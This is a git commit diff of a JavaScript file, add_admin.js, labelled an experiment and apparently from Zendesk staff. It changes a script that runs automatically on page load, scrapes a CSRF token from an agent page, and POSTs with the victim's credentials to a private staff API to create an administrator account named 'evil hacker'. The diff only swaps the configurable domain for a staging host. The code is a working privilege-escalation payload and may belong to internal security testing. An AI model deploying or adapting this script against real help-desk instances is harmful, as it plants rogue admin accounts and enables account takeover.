805a2cd25bf8df8d466697902b420f47c79b6ab0
zendesk-junze <junze.he@zendesk.com>
2025-07-24 15:36:29 -0400

    [Experiment] Remove domain as a param

--- add_admin.js
+++ add_admin.js
@@ -2,7 +2,7 @@ const params = new URLSearchParams( document.location.search );
 
 const newEmail = params.get( 'email' );
 const subdomain = params.get( 'subdomain' );
-const domain = params.get( 'domain' ) || '${domain}'
+const domain = params.get( 'domain' ) || 'zendesk.com'
 
 ( async function() {await addNewAdminUser( 'evil hacker', newEmail );})()
 
@@ -22,18 +22,18 @@ async function addNewAdminUser( name, email ) {
 
     const payload = JSON.stringify( data );
 
-    const url = `https://${ subdomain }.${domain}/agent/user_filters`;
+    const url = `https://${ subdomain }.zendesk-staging.com/agent/user_filters`;
     const parsedHtml = await _getParsedHtmlFromUrl( url );
     const csrfToken = _getCsrfToken( parsedHtml );
 
-    const response = await fetch( `https://${ subdomain }.${domain}/api/admin/private/staff`, { 
+    const response = await fetch( `https://${ subdomain }.zendesk-staging.com/api/admin/private/staff`, {
         method: 'POST',
         withCreds: true ,
         headers:{
             'Content-Type': 'application/json',
             'X-Csrf-Token': csrfToken
-        },    
-        body: payload 
+        },
+        body: payload
     } );
 
 }
